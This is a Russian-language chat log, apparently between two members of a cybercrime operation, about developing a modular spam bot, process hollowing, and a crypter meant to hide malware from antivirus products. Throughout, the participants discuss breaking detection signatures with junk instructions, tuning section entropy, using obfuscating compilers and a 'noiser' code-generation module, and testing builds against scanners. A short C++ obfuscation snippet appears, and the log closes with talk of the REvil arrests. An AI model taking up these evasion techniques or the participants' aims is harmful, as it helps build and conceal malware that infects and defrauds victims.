[06.01.22 11:14:13] basil:		страсть*
[06.01.22 11:14:57] basil:		Я там пытался по него (emotet) что-то узнать. Как я понял там модульная конструкция. Всего этого хозяйства
[06.01.22 11:17:43] basil:		Я ему ответил что в принципе это возможно. Вроде как загрузчик dll у нас есть. Проблем с этим быть не должно. Мне так кажется. Так вот.... В чем собственно вопрос. С твоей стороны нет ли в этой задумке фундаментальных проблем, которые не позволят релизовать задуменное?
[06.01.22 11:18:09] basil:		кучу опечаток сделал. Блин.
[06.01.22 11:19:24] elroy:		Я понял смысл, не смотря на опечатки. Но вопроса не понял, наверное не дстаточно информации. Уточни, что за модульность, что именно он хочет? Проект в виде dll - да, разбить спамбота на блоки в виде dll - да...
[06.01.22 11:19:30] elroy:		Или что-то другое надо?)
[06.01.22 11:20:04] basil:		Разбить спам бота на блоки dll
[06.01.22 11:20:11] basil:		я так понял
[06.01.22 11:20:44] basil:		Что бы один только рассылку делал, другой только грабил контакты
[06.01.22 11:20:51] basil:		там третий только собирал информацию о системе и так далее
[06.01.22 11:21:04] basil:		и вот еще что
[06.01.22 11:21:21] basil:		Сейчас спамбот кросс разрядный
[06.01.22 11:21:51] basil:		Но делаетсч он таким только за счет инъекции кода в 64 битный процесс.
[06.01.22 11:24:27] basil:		Так вот есть релизация когда мы из WoW64 обращаемся в 64 битную подсистему windows. У меня работает на ОС старше win7.  У win7 есть некторые проблемы. Не мог бы краем глаза взглянуть. Что там не так суть проблемы понятна. Не понятно как ее решить - обойти
[06.01.22 11:25:18] elroy:		Краем не получится... Это надо вникать в отладку
[06.01.22 11:26:43] elroy:		Там суть именно в том что на вин7 не работает, или есть еще что-то известное, например, в чем отличие?)
Может ему какой функции не хватает? Проверить бы используемые на msdn, там можно увидеть будет минимальные требования к функции
[06.01.22 11:28:34] basil:		нет . все там хватает. Ладно это моя проблема. Самтогда буду ее решать. У тебя наверное свои забот хватает
[06.01.22 11:29:01] elroy:		Тот кусочек кода что я скидывал, который позволяет холовинг делать на с 32х битного 64х битное создавать, он тестировался на вин7, он там работал. Т.е. холовинг сам работает. Наверное не находит какую-то функцию на вин7 в библиотеке
[06.01.22 11:30:04] basil:		К холловингу претензий нет. Он работает отлично. Можно даже сказать "на ура"
[06.01.22 11:30:26] basil:		ок. Спасибо.
[06.01.22 11:30:55] elroy:		Добавь строчку отладки в GetApi, там где функция ищется. Если не найдет - как раз увидишь)
[06.01.22 11:31:13] basil:		ок
[12.01.22 13:16:48] basil:		тест
[12.01.22 13:16:54] basil:		отлично
[12.01.22 13:17:04] basil:		Вопрос собственно такой
[12.01.22 13:19:22] basil:		Есть утилита такая objconv (object converter). Она переводит бинарный файл в ассемблерный код. Переводит не без ошибок, но их количество не бесконечно (руками можно поправить). Пробовал провести такую же оперцию с помощью Ida pro, но количество ошибок зашкаливыает и конца и края не видно. Так вот....
[12.01.22 13:19:38] basil:		В чем собственно вопрос
[12.01.22 13:25:09] basil:		Вопрос состоит в том, что (на твой взгляд). Возможно ли реализовать такую парадигму. 
Пишем программу на с/с++ (например тот же самый криптер). Компилируем. Переводим бинарник в код ассемблера. И заново собираем с помощью например того же самого MASM. Зачем все эти операции. Хотелось бы как то попытаться автоматизировать процесс чистки. Т.е. берется собраный из личтинга ассемблера бинарник. Проверяется на АВ. Локализуется детект. Далее в ассемблерном коде сингнатура разбивается "холостым кодом"
NOP
или например
push EAX
pop EAX.
и бинарник и чистый бинарник собирается заново.
Как ты думаешь "теоретическая" возможно все это реавлизовать на практике есть. Или игра не стоит свеч.
[12.01.22 13:25:48] basil:		возможность*
[12.01.22 13:29:33] elroy:		Игра стоит любых свечь)
То что ты пишешь - да, возможно, но сложно.
Зачем делать все так сложно...
Сейчас практикуется шеллкод, он мало места занимает и его цепляют на любой готовый exe. Об это Сильвер изначально говорил.
Твой вариант я бы упростил. Собирал бы из .lib - статических библиотек и менял бы библиотеки эти.
Т.е. бьется прога на библиотеки, потом эти библиотеки собираем другим компилятором в кучу. Но реч именно о статических библиотеках.
[12.01.22 13:30:42] basil:		хорошо. спасибо. Я прямо духом воспрял
[12.01.22 13:30:46] basil:		правда)))
[12.01.22 13:31:39] elroy:		Можно эту библиотеку на выском уровне уже править. Я понял твою идею по автоматизации. Хочешь чтоб прям совсем автоматом, нашло и переписало фрагмент.
[12.01.22 13:31:52] basil:		ну вот да
[12.01.22 13:32:03] basil:		очень много сил чистка занимает конечно
[12.01.22 13:32:14] basil:		долго муторно
[12.01.22 13:35:13] elroy:		Можно переписать и высокоуровневый код, так проще.. Ну или тогда уже бороться с патчем самому. В плане самостоятельно синтезировать нужне инструкции. Распарсить и синтезировать новые. Просто писать штуку, которая пишет код на асме, который потом компилируется - сложнее, чем самому считать и заменить команду в байтах. У Иды есть синхронизация вкладок, это очень удобно) Синхронизируй вкладку асма и вкладку hex, выделяешь мышкой команду, видно байты. Их парсить назад - существенно прощу, чем читать/писать ассемблерный код (сам код)
[12.01.22 13:35:50] elroy:		А вообще, попробовать надо идею с библиотекаими статическими, и собирать их с помощью llvmo
[12.01.22 13:36:09] elroy:		Вышел 12 ллвмо, он весьма инетресен))
[12.01.22 13:36:30] basil:		ну прием с синхронизацией вкладок я знаю. Именно так и ищу
[12.01.22 13:36:34] basil:		детекты
[12.01.22 13:36:34] elroy:		Сборка с помощью ллвмо автоматизирует придуманный тобой процесс)
[12.01.22 13:38:01] basil:		Вот честно говоря с llvm не совсем понятно. Пардну просим , но не понятно. Можно чуть подробнее. Если конечно есть возможность. Ну или ссылку если есть
[12.01.22 13:39:06] elroy:		Есть llvm, а есть llvmo - это обфусцирующий компилятор. Он берет твой код на С++ и компилирует по разнмоу каждый раз.
[12.01.22 13:39:10] elroy:		Щас ссылку дам
[12.01.22 13:39:18] basil:		жду
[13.01.22 12:04:09] elroy:		Да. Ну хорошо. Пусть работает))
[13.01.22 12:05:02] basil:		И добавлю что энтропию менял для всех секций\
[19.01.22 12:17:21] basil:		Приветствую
[19.01.22 12:17:56] basil:		тест
[19.01.22 12:18:22] elroy:		отр?
[19.01.22 12:18:33] basil:		да
[19.01.22 12:18:40] basil:		тест
[19.01.22 12:18:46] basil:		о отлично
[19.01.22 12:19:39] basil:		там в чате было сообщение что можно зарубить трафик который идет не через VPN.  Может скинешь кукую ссылочку почитать
[19.01.22 12:19:41] basil:		?
[19.01.22 12:21:06] elroy:		Вот ссылочку не скину. Не описано оно как-то, надо искать.
Идея в том, что мы на ВМ запускаем линукс, минимального содержимого обычно, с iptables и мелочью разной по вкусу (в том числе с опенвпн и тором например).
[19.01.22 12:21:27] elroy:		Впускаем интернет на машину, как угодно, но мимо системы.
[19.01.22 12:21:58] elroy:		А на систему и на все остальные вм интернет раздается через эту вм (маршутизатор).
[19.01.22 12:22:09] elroy:		Настраиваем там iptables...
[19.01.22 12:22:19] elroy:		Такой вот способ
[19.01.22 12:22:45] elroy:		Почитать могу предложить официальную доку Дженту, например, или Арч
[19.01.22 12:23:31] elroy:		У дженту там есть "домашний роутер" статья (в руководсве), там написано как. Но там есть грубейщая ошибка в натсройке фаервола))
[19.01.22 12:24:16] basil:		Если можно скинь - хотелось бы посмотреть как это все можно сделать. Хотя бы теоретически
[19.01.22 12:24:34] elroy:		Скинуть что именно?)
[19.01.22 12:24:43] elroy:		Настройки iptables могу скинуть
[19.01.22 12:24:51] elroy:		Остально все стандартное...
[19.01.22 12:26:19] elroy:		Почитай для начала Дженту handbook, там инструкция по установке системы. Поставь по инструкции
[19.01.22 12:26:23] elroy:		Там описан минимум
[19.01.22 12:26:26] elroy:		Потом продолжим
[19.01.22 12:26:33] basil:		Дженту это сборка линуксовая?
[19.01.22 12:26:55] basil:		я подумал это "автор" из интеренетов
[19.01.22 12:27:18] elroy:		Это операционка линукс. Она на исходниках основана, собирается только из исходников, полностью, никакой проприетарщины
[19.01.22 12:28:11] basil:		вот теперь ясно)))
[19.01.22 12:28:49] elroy:		Там даже на русском)))
[19.01.22 12:29:26] elroy:		Можно пойти более простым путем, если это сложно и новое что-то..
[19.01.22 12:29:37] elroy:		Можно поставить роутер, натсроить его под себя
[19.01.22 12:29:52] elroy:		Это чем-то проще
[19.01.22 12:30:38] elroy:		Из простого - фаервол и настроки по mac адресу, кому можно, кому нельзя.
[19.01.22 12:30:45] elroy:		Виртуальной машине можно, хосту нельзя
[19.01.22 12:31:34] elroy:		Тема большая... Я возможно сделаю общие рекомендации для всех, но позже
[24.01.22 11:59:25] basil:		Приветствую
[24.01.22 12:01:54] elroy:		Слушаю
[24.01.22 12:02:13] elroy:		Приветствую
[24.01.22 12:03:04] basil:		Я сейчас несколько свободен от спим-бота. Там никак тестовое окружение с ВМ не настроят. Я по криптеру нужен?
[24.01.22 12:03:24] basil:		Я сейчас свободен
[24.01.22 12:04:37] elroy:		Пригодшься))
[24.01.22 12:04:47] elroy:		Напши Орвалу, сейчас он криптерами занимается
[24.01.22 12:04:58] elroy:		Я кстати ему передал еще и криптер2 сегодня
[24.01.22 12:06:52] basil:		Передал? Ну ладно. Напишу конечно. А сам ушел из криптеров? На повышение?
[24.01.22 12:09:38] elroy:		Временно подменю Сильвера по остальным проектам, подтяну, чтобы ничего не потануло
[24.01.22 12:09:54] elroy:		Буду смотреть и за криптерам
[24.01.22 12:11:13] basil:		хорошо.
[24.01.22 12:11:15] basil:		ок
[24.01.22 16:19:05] basil:		тест
[24.01.22 16:19:54] elroy:		Будешь править криптер, там нало поправить заодно генератор случайных чисел, который софтварный. Тот что работает когда не работает аппаратный интеловский
[24.01.22 16:20:39] elroy:		Поправить его надо потому, что он имеет периодичность
[24.01.22 16:21:33] elroy:		если генерировать числ (dword) подярд, то их последние байты повторяются
[24.01.22 16:22:06] elroy:		С периодичностью то ли 8 то ли близко к 8
[24.01.22 16:22:17] elroy:		Диего заметил
[24.01.22 16:22:21] elroy:		Ну и глазомер...
[24.01.22 16:22:31] basil:		забрал
[24.01.22 16:22:49] basil:		У меня целый день  - какие -то дурацкие ошибки
[24.01.22 16:22:59] basil:		Уже потом покрылся от злости
[24.01.22 16:23:10] elroy:		А что за ошибки?
[24.01.22 16:23:46] basil:		ну например делаю тестовый файл для криптера по пути C:\test\test.exe
[24.01.22 16:23:56] basil:		Запускаю криптер
[24.01.22 16:24:29] basil:		Говорит что файла такого нет. Проверил - на месте. Может путь написал неправильно нет - все правильно
[24.01.22 16:25:07] basil:		Потом случайно переименовал файл в просто test
[24.01.22 16:25:22] basil:		А он подсвечиваентся все равно как exe
[24.01.22 16:25:52] basil:		Потом до менчя дошло что я не убрал галочку скрывать расширения файлов
[24.01.22 16:26:08] basil:		и в реальности путь был C:\test\test.exe.exe
[24.01.22 16:26:18] basil:		Поэтому он его открытиь не мог
[24.01.22 16:26:34] basil:		У меня аж пар из ушей пошел от злости
[24.01.22 16:27:40] elroy:		Ты еще легко отделался) Стентон сегодня написал, что словил локреа, второй раз. Причем переименовал файл в .ex_, и в скрипте точно так же переименовал, но шибся и запусктил его через скрипт...
[24.01.22 16:28:14] basil:		и на том спасибо.....
[24.01.22 16:28:28] basil:		понедельник день точно тяжелый
[24.01.22 16:29:02] elroy:		Да, на себе прочувствовал
[24.01.22 16:29:48] basil:		Растешь по служебной лестнице. Зам. главного. Поздравляю!
Правда без подколов
[24.01.22 16:45:28] elroy:		Спасибо за поздравления. На самом деле все не так светло. Я бы предпочел с 8 до 17 с перерывом просто писать код, как было когда-то. Было беззаботно и хоршо)
[24.01.22 16:48:00] elroy:		Помню еще давно меня Сильвер когда нанимал, давал ТЗ, я еще с ним согласовывал чтобы не с 8 до 17 а с 9 до 18, по мск.
[24.01.22 16:48:25] elroy:		А потом просто через время так слегоца сдвинулось к с 10 до 18 )))
[24.01.22 16:53:12] elroy:		бывает
[24.01.22 16:53:34] elroy:		хм
[24.01.22 16:53:41] elroy:		а все равно без отр
[24.01.22 17:18:54] elroy:		тест
[24.01.22 17:18:57] basil:		тестъ
[24.01.22 17:19:05] elroy:		)))
[24.01.22 17:19:05] basil:		да. вот
[24.01.22 17:25:07] elroy:		От меня все сообщения дошли, те что без отр?
[24.01.22 17:25:18] elroy:		Я там про время писал
[24.01.22 17:25:31] basil:		да.
[24.01.22 17:25:41] basil:		были эти сообщения
[24.01.22 17:25:56] basil:		может я просто браузер старый использовал
[24.01.22 17:26:31] elroy:		Старый вроде стабильный
[24.01.22 17:26:39] elroy:		Вот новый 11 падал
[24.01.22 17:26:51] elroy:		Но падал тоже стабильно
[24.01.22 17:26:59] basil:		)))
[24.01.22 17:27:06] basil:		Стабильно падал
[24.01.22 17:27:08] basil:		)))
[24.01.22 17:27:25] basil:		Все таки в чувстве юмора тебе не откажешь
[24.01.22 17:27:58] elroy:		Да)
[24.01.22 17:28:47] basil:		слушай тут от детектов пытаюсь целый день очистить. Пишет в основном в детектах HEUR
[24.01.22 17:28:55] basil:		это же детект по энтропии
[24.01.22 17:29:03] basil:		правильно?
[24.01.22 17:30:30] elroy:		Не только по ней
[24.01.22 17:30:48] elroy:		Это эвристика. Т.е. любые подозрительные признаки
[24.01.22 17:31:17] elroy:		Это то, что он не модет сказать точно, но оно имеет какую-то схожесть между тем, что у него есть в сигнатурах
[24.01.22 17:31:35] basil:		ну вот обычно вся эта эвристика как-то сводилась к энтропии.
[24.01.22 17:31:56] elroy:		Но ведь настраивал энтропию?
[24.01.22 17:32:06] basil:		да
[24.01.22 17:32:09] elroy:		Не помогет?
[24.01.22 17:32:12] basil:		естественно
[24.01.22 17:32:15] basil:		помогает
[24.01.22 17:32:17] elroy:		Значит не энтропия
[24.01.22 17:32:23] elroy:		(прости за очевидность)
[24.01.22 17:32:46] elroy:		А, так помогает
[24.01.22 17:32:51] elroy:		Так это хорошо)))
[24.01.22 17:32:55] elroy:		Это прекрасно
[24.01.22 17:32:59] elroy:		Значит хороший криптер
[24.01.22 17:33:33] basil:		там есть какой-то детект у nod32
[24.01.22 17:33:41] basil:		это не энтропия
[24.01.22 17:33:54] basil:		но он как-то странный то появиться то пропадет
[24.01.22 17:34:22] basil:		а часть детектов с словом heur удалось убрать именно с помощью коррекции энтропии
[24.01.22 17:34:29] elroy:		Если смотришь на динчеке, то это динчек глючит. Он не появляется и пропадает, он там есть стабильно.
[24.01.22 17:34:49] elroy:		Причем даже не динче
[24.01.22 17:34:52] elroy:		*динчек
[24.01.22 17:35:02] elroy:		Я проверял один файл у себя и на динчеке
[24.01.22 17:35:16] elroy:		Стабильно отловил, что у меня нет детекта, на динчеке есть, и наоборот
[24.01.22 17:35:29] elroy:		Потом отловил что на одной машине стабльно есть, а на другой нет
[24.01.22 17:35:37] elroy:		Это у них антивир глючит)
[24.01.22 17:35:43] elroy:		Куда без багов
[24.01.22 17:36:29] elroy:		Но это значит что он есть, просто нод пропускает
[24.01.22 17:37:21] basil:		https://dyncheck.com/scan/id/72f583a7aff0eb358d1c117c6b545c39
[24.01.22 17:37:57] basil:		https://dyncheck.com/scan/id/d3183f4945e0a9d51cef2001be4f1c09
[24.01.22 17:38:28] basil:		это с разными энтропиями
[24.01.22 17:38:57] basil:		ну да ладно. сейчас попробуем сначала nod почистить
[24.01.22 17:40:41] elroy:		У нода может быть детект на обфускацию кода, а конкретно на тот разыгрываемый механизм, где две переменные случайно уточняются
[24.01.22 17:43:00] elroy:		Я сейчас скину код, это обноыленный noiser, я еще не успел интегрировать в криптер сам код
[24.01.22 17:43:11] elroy:		Надо только перенести
[24.01.22 17:43:15] elroy:		Там новый алгоритм
[24.01.22 17:43:54] elroy:		Или успел
[24.01.22 17:44:12] elroy:		Глянь в коде, есть там condiGen в ReadyCodeObfuscator
[24.01.22 17:45:28] basil:		нет. строка "condiGen" не найдена
[24.01.22 17:45:39] elroy:		сейчас скину тогда
[24.01.22 17:48:47] elroy:		```
https://file.io/GSWyyMkFMzHz
```
[24.01.22 17:51:40] basil:		сейчас добавлю. Попробуем
[24.01.22 18:13:31] basil:		ну по крайней мере nod32 ушел
[24.01.22 18:13:32] basil:		ушел стабильно
[24.01.22 18:13:43] basil:		надо как-то энтропию подобрать
[24.01.22 18:13:48] basil:		там дело в энтропии
[24.01.22 18:14:05] elroy:		Прекрасно)
[24.01.22 18:14:57] basil:		секция data однозначно очень низкая 2ю6
[24.01.22 18:14:59] basil:		2,6
[24.01.22 18:15:01] elroy:		Там энтропия в норме просто должна быть и не превышать 7, обычно от 5.0 до 6.5 ставим, может там зависимость по размеру есть...
[24.01.22 18:15:17] elroy:		На рдате
[24.01.22 18:24:14] basil:		https://dyncheck.com/scan/id/e03ca1223321343e5251e2483492ce2d
[24.01.22 18:24:19] basil:		почти у цели
[24.01.22 18:24:39] basil:		и это все "игра в энтропию"
[24.01.22 18:27:17] basil:		еще получше
[24.01.22 18:27:18] basil:		https://dyncheck.com/scan/id/5db62305a372c821bf6457671738badc
[24.01.22 19:00:21] basil:		ну вообщем на мой взгяд это энтропия. Но пока подобрать нужные значения как-то не получается
[26.01.22 14:11:35] elroy:		Приветствую
[26.01.22 14:12:06] elroy:		Скажи, сейчас криптером занят или спамботом?
[26.01.22 14:12:33] basil:		сейчас криптереом
[26.01.22 14:12:41] basil:		jefferson молчит
[26.01.22 14:12:50] elroy:		Ясно
[26.01.22 14:13:21] basil:		медленно конечно
[26.01.22 14:14:01] basil:		не знаю при одном уровне энтропии детект на одном ав при другом он исчезает
[26.01.22 14:14:06] basil:		Появляется у другого ав
[26.01.22 14:14:33] basil:		Я крипт разбивал на блоки.
[26.01.22 14:14:38] elroy:		dll или ede ?
[26.01.22 14:14:46] basil:		exe
[26.01.22 14:15:15] basil:		там куда файлов получается которые чистые
[26.01.22 14:15:17] basil:		куча
[26.01.22 14:15:36] basil:		конкретного места детекта  я не нахожу
[26.01.22 14:15:39] elroy:		Там для exe в стабе отсутсвует обертывние кода под noiser, алгоритмы запуска exe не обернуты. Возможно стоит обернуть)
[26.01.22 14:16:04] basil:		сейчас момент
[26.01.22 14:32:19] basil:		тест
[26.01.22 15:03:34] elroy:		отр?
[26.01.22 15:04:30] basil:		что то там не так с криптером. Хорошо, что за dll сказал
[26.01.22 15:04:39] basil:		dll чистая
[26.01.22 15:04:51] basil:		всмысле если в форме dll делаем
[26.01.22 15:05:27] elroy:		Там алгоритм развертывания не обернут кодом ноисера для ехе. Там другой код для exe, а для dll обернут
[26.01.22 15:05:31] elroy:		Надо обернуть
[26.01.22 15:05:59] elroy:		Надо просто расставить комменты обфускатора правильно.. Затестить.
[26.01.22 15:07:21] basil:		по-моему там все обернуто. По крайней мере UniCripterProj.cpp.build
[26.01.22 15:07:29] basil:		там есть обфускация
[26.01.22 15:07:48] elroy:		Да. файлик этот.
[26.01.22 15:07:51] elroy:		Но глянь исходник
[26.01.22 15:08:02] elroy:		Там нету для exe обфускации
[26.01.22 15:09:03] elroy:		Найди например функцию PeLdrApplyImageRelocations
[26.01.22 15:09:07] elroy:		Она не обернута
[26.01.22 15:09:33] elroy:		PeLdrRelocateAndContinue
[26.01.22 15:09:52] elroy:		Это все загрузчик exe
[26.01.22 15:11:49] elroy:		Там вот особенность того загрухчика в том, что он сам себя перемещает. а на свое место помещает секции полезной нагрузки. Так вот там при самопермещенни особенности выполнения кода. Я не тестил это с шумм ноисера, незнаю как отработает выполение кода в случае самоперемещения, не упадет ли оно..
[26.01.22 15:11:56] elroy:		Вот это надо потестить
[26.01.22 15:12:48] basil:		хорошо. давай ток попробуем
[26.01.22 15:47:44] basil:		там реализованы какие обработчики ошибок в итоговом бинарнике?
[26.01.22 16:04:46] elroy:		Там нет обработчиков ошибок
[26.01.22 16:04:52] elroy:		Или я не понял вопроса..
[26.01.22 16:05:06] basil:		вопрос понял правильно
[26.01.22 16:05:39] basil:		ладно. посмотрим как ведет себя кри птер под отладкой
[26.01.22 16:15:29] elroy:		exe под отладкой он не развернет правиль
[26.01.22 16:15:45] elroy:		Говорю же, пермещает сам себя
[26.01.22 16:15:52] basil:		я поню
[26.01.22 16:15:59] basil:		помню
[26.01.22 16:16:16] elroy:		Там можно поправить систему логирования
[26.01.22 16:16:27] elroy:		По логу вот будет все видно что куда пошло
[26.01.22 16:16:58] basil:		еще вопрос. Вот этот код, который скинул. Он тестировался?
[26.01.22 16:17:46] elroy:		Скажем так, я его проверял. Работало. Но вот погонять под нагрузкой - не делал. Т.е. разнородные тесты не устраивал
[26.01.22 16:18:31] elroy:		Просто закриптовал, работало. Закриптовал - использовал криптер 8, там сам ноисер используется для обфускации
[26.01.22 16:20:22] basil:		ну вот как-то через раз. Хорошо. посмотрим что получится
[26.01.22 16:20:22] basil:		тест
[26.01.22 16:20:48] elroy:		Посмотри конечно... Может и через раз, наодо тогда отладить)
[26.01.22 16:21:42] basil:		там быввает так что крипер висит в процессах. Съедает 70% цп. Но результата его работы нет
[26.01.22 16:22:40] elroy:		А собираешь студией 2022
[26.01.22 16:22:41] elroy:		?
[26.01.22 16:22:57] basil:		да
[26.01.22 16:23:45] elroy:		Вот у меня было такое. Не смог отловить. Но это не с обновлением связано, пробелма такая и раньше наблюдалась.
[26.01.22 16:24:14] elroy:		Такое зацикливание может быть в коде обфускатора в том случае, если мы иде не по корректному словию
[26.01.22 16:24:21] elroy:		Т.е. идет управление в мертвый код
[26.01.22 16:24:28] elroy:		А это очень легко проверить
[26.01.22 16:24:49] elroy:		Надо просто в генераторе кода где мертвое словие добавть MessgeBox...
[26.01.22 16:24:53] elroy:		Я так делал
[26.01.22 16:25:00] elroy:		Управление туда не попадает"
[26.01.22 16:25:25] elroy:		Есть предположение, что это косяк 2022 студии, оно какую-то фигню собирает
[26.01.22 16:25:59] basil:		хорошо. ок
[02.02.22 08:41:38] elroy:		Приветствую
[02.02.22 08:41:59] basil:		Тест
[02.02.22 08:42:11] elroy:		тест
[02.02.22 08:42:12] basil:		тест
[02.02.22 08:42:17] basil:		приветствую
[02.02.22 08:42:28] elroy:		Тебя jefferson искал
[02.02.22 08:42:48] basil:		Уже поговорили. Все нормально
[02.02.22 08:43:58] basil:		Сильно болел. Франчес был в курсе я ему написал с трудом. Потом в больнице лежал. Связи не было. Поэтому был недоступен
[02.02.22 08:44:11] basil:		Тебе отписаться не смог
[02.02.22 08:44:17] elroy:		Ковид?
[02.02.22 08:45:02] basil:		да там станная ситуация. Четверть больницы лежит ОРВИ (по симптомам) . Тесты отрицательные.
[02.02.22 08:45:57] basil:		Что бы тебе что то серьезное выписали - надо лежать в стационаре. Чуть полегчало - сразу - домой. Койко мест не хватаетю В палатах аншлаг.
[02.02.22 08:46:27] basil:		Вообщем  очень быстро распростанаяется
[02.02.22 08:46:48] basil:		Будь предельно осторожен - не дай бог вляпапться
[02.02.22 08:48:21] basil:		это мне еще сказали повезло - прививку эту сделал. А не сделал бы, тогда еще неделя
[02.02.22 08:48:30] basil:		при хороших раскладах
[02.02.22 12:22:41] elroy:		тест
[02.02.22 12:23:11] basil:		тест
[02.02.22 12:23:48] basil:		писал?
[02.02.22 12:24:27] elroy:		да
[02.02.22 12:24:55] basil:		звук был, а текста нет
[02.02.22 12:25:00] basil:		повтори
[02.02.22 12:27:52] elroy:		Повтори пожалкйста сообщения что писал, посление 6
[02.02.22 12:28:00] elroy:		У меня на тот момент браузер рухнуд
[02.02.22 12:28:38] basil:		)))
[02.02.22 12:29:44] basil:		да собсвенно сообщнния были с предостережениями. Побречься - в больницах очень бысро растет заболеваемость.
[02.02.22 12:30:19] basil:		и полный "ашлаг"
[02.02.22 12:30:59] elroy:		Я думал что-то новое)
[03.02.22 08:05:26] elroy:		работает
[03.02.22 08:05:49] basil:		Да. но только у меня опять кнопочка куда-то делась
[03.02.22 08:06:04] elroy:		обнови страницу
[03.02.22 08:06:16] basil:		момент
[03.02.22 08:06:53] basil:		да. согласен. спасибо
[04.02.22 15:44:16] basil:		Тест
[04.02.22 15:45:53] elroy:		отр?
[04.02.22 15:46:02] basil:		да
[04.02.22 15:46:06] basil:		тест
[04.02.22 15:46:08] basil:		отлично
[04.02.22 15:46:20] basil:		есть маленький вопрос по криптеру
[04.02.22 15:46:38] basil:		есть участок кода , проводящий кодогенерацию
[04.02.22 15:46:57] basil:		```
		string lmbd = "auto lmbd = [=]()->int { static bool isInit = false; if (!isInit) { isInit = true; "
			+ condiGen.GetInitFunctionCall() +"} return " + to_string(randGen.GetRandom(32767-1024)+1024) + "; };";
		string head = lmbd + "\r\n" + label1 + ":\r\n" + codeGenHead;
```
[04.02.22 15:47:54] basil:		Можно как-то пояснить почему выбран был именно такой диапазон
```
to_string(randGen.GetRandom(32767-1024)+1024)
```
[04.02.22 15:47:59] basil:		?
[04.02.22 15:48:28] basil:		там в некоторых местах получается зацикливание в конце подпрограммы , где goto
[04.02.22 15:52:25] elroy:		Зацикливание не предусмотрено., можно поправить. Я не помню из чего именно исходил, но значение должно быть больше 1024 и 32768.
Вот 32768 - это 65535 / 2 - т.е. это два байта, он же тип WORD, который можетбыть signed и unsigned, и чтобы не напаросться на его signed часть, использована его половина, чтобы точно unsigned, ну и -1024 - чтобы влезло в + 24.
Там есть в случайных условиях, мне помнится, тип переменных word, а значит если тут привысить, тот тот word что там присваивается - обрежется, код пойдет не туда
[04.02.22 15:54:46] basil:		вопрос. А если выйдет так
```
auto lmbd = [=]()->int { static bool isInit = false; if (!isInit) { isInit = true; InitFunction_CondiVars_ftJupzeBwyaRiXqD();} return 9733; };
qbnhkFVItrbOINGBoX:
char hImxYQSF=(char)lmbd();
```
[04.02.22 15:55:12] basil:		char получается при определенных условиях может быть отрицательным
[04.02.22 15:55:47] elroy:		Это как раз то о чем я и писал.
Да, там мало того что ты точно не знаешь что останется от числа 9733, еще может быть и отрицательным
[04.02.22 15:56:14] elroy:		Поэтому там минимальная размерность должна быть word signed
[04.02.22 15:56:16] basil:		хорошо. понял.
[04.02.22 15:56:20] basil:		Наверное...
[04.02.22 15:57:27] elroy:		там int16_t минимальный тип
[04.02.22 15:58:14] elroy:		Теоретически все верно, циклиться не должно) Глянь отладчиком что там за значения приводят к циклу.
[04.02.22 15:58:44] elroy:		И я смотрел там через MessageBox, оно не попадало в мертыве условия
[04.02.22 15:58:54] elroy:		Может где оптимизатор ошибся чего-то
[04.02.22 15:59:03] basil:		да. вот как я вижу зацикливание есть
[04.02.22 15:59:15] basil:		при отладке
[10.02.22 12:26:55] elroy:		Приветствую
[10.02.22 12:27:00] basil:		Приветствую
[10.02.22 12:27:09] elroy:		Над каким проектом сейчас работаешь?
[10.02.22 12:27:10] basil:		насчет diego?
[10.02.22 12:27:18] elroy:		И насчет него)
[10.02.22 12:27:26] basil:		сейчас над спам ботом
[10.02.22 12:27:47] basil:		с diego сейчас высылаю ему noiser
[10.02.22 12:40:16] basil:		Вопрос есть. Тут diego написал, что в noiser должна быть какая-то "шестая цифра". Я не совсем понял про что это?
[10.02.22 13:01:03] elroy:		code-complexity
[10.02.22 13:01:04] elroy:		Там 5 цифр, добавилась шестая - это вложенность условия if
[10.02.22 13:01:30] basil:		ок. принял
[10.02.22 14:14:33] basil:		нашли. diego передал
[21.02.22 13:33:16] basil:		приветствую
[21.02.22 13:33:27] elroy:		Приветствую
[21.02.22 13:33:37] basil:		Жаль конечно. Интересный был опыт. Такого у мекня еще не было
[21.02.22 13:33:53] elroy:		Дай дочитаю)
[21.02.22 13:41:48] basil:		тест
[21.02.22 13:42:03] elroy:		Ну да
Так и предполагал
Скинь ему контакты, может будет перезагрузка
[21.02.22 13:42:33] basil:		попробуем. Хотя как говрится "свежо питание, но серится с струдом."
[21.02.22 13:42:51] basil:		Но попытка не пытка
[21.02.22 13:43:36] basil:		кто бы ты не был хочу сказать тебе "спасибо". Многому научил
[21.02.22 13:44:07] elroy:		Наверняка еще встретимся
[21.02.22 13:44:14] basil:		думаешь?
[21.02.22 13:44:17] elroy:		Хотя кто знает
[21.02.22 13:44:22] elroy:		И тебе спасибо за работу)
[21.02.22 13:44:57] elroy:		Думаю да. Еще встретишь товарища, кто будет дотошно чем-то грузить, как я ))
[21.02.22 13:45:13] basil:		это ты то грузить)))
[21.02.22 13:45:16] basil:		да ладно)))
[21.02.22 13:45:26] basil:		если бы меня так в институте учили)))
[21.02.22 13:45:28] basil:		как ты
[21.02.22 13:45:29] elroy:		А вот отдых и правда не помешает.. Релаьно устал, из отпуск ни разу не отдохнул
[21.02.22 13:45:45] basil:		я тоже как то на пределе
[21.02.22 13:45:58] basil:		плюс все эти дела на границе
[21.02.22 13:46:09] elroy:		Ты из днр ?
[21.02.22 13:46:47] elroy:		Или из фсб?
[21.02.22 13:46:57] basil:		Не буду говорить откуда (сам понимаешь) Но у меня очень серьезные сведения что на границе не учения
[21.02.22 13:47:07] basil:		там знакомый живет
[21.02.22 13:47:26] basil:		говорит по ночам столько техники прозходит
[21.02.22 13:47:35] elroy:		жесть
[21.02.22 13:47:59] basil:		разве не учения  ночью будут столько гнать?
[21.02.22 13:48:26] basil:		на учения*
[21.02.22 13:49:47] elroy:		Если бы я знал... У меня раньше в детстве вообще недопонимание было как можно на учения тратить столько денег, на самолеты, танки, топливо..
[21.02.22 13:53:43] basil:		Я думаю чт руководителей ситуация с равилами напугала. А по мне так низшее звено взяли.
[21.02.22 13:55:10] basil:		Байден Путин там поговорили. Россияне решили прогнуться взяли кого могли
[21.02.22 13:55:18] basil:		И это многих напугало
[21.02.22 13:55:45] elroy:		Обрати внимание, тчо Ревилам предъявили не разработку вредоносных программ, а незаконны оборот средств, и только. А значит у них ничего не нашли, т.е. ребята хорошо работали. Их просто сдали...
[21.02.22 13:56:03] basil:		Да-да-да я тоже обратил на это внимание
[21.02.22 13:56:11] basil:		Низшее звено взяли
[21.02.22 13:56:26] basil:		Тех кто обнал делал
[21.02.22 13:56:28] elroy:		Будем надеяться что так
[21.02.22 13:56:58] elroy:		Надеюсь у нас руководство очухается
[21.02.22 13:57:38] basil:		Надеюсь....
